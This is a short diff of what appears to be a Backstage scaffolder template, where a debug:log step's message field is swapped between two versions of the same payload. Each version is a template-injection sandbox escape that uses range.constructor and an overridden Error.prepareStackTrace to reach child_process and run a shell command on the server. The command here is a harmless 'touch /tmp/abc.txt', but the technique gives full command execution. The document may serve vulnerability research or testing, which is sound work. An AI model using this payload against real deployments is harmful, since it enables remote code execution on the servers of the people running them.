@@ -12,6 +12,4 @@ spec:
       name: Log Message 
       action: debug:log
       input:
-        message: Hello ${{range.constructor("this.env.__proto__.renderString = function() {globalThis.OldError = globalThis.Error;globalThis.Error = class Error {};globalThis.Error.prepareStackTrace = (cs,trace) => {trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"touch /tmp/abc.txt\");};const {stack} = new globalThis.OldError();}")().triggerException()}} 
-
-
+        message: ${{range.constructor("this.env.__proto__.renderString = function() {globalThis.OldError = globalThis.Error;globalThis.Error = class Error {};globalThis.Error.prepareStackTrace = (cs,trace) => {trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"touch /tmp/abc.txt\");};const {stack} = new globalThis.OldError();}")().triggerException()}} 
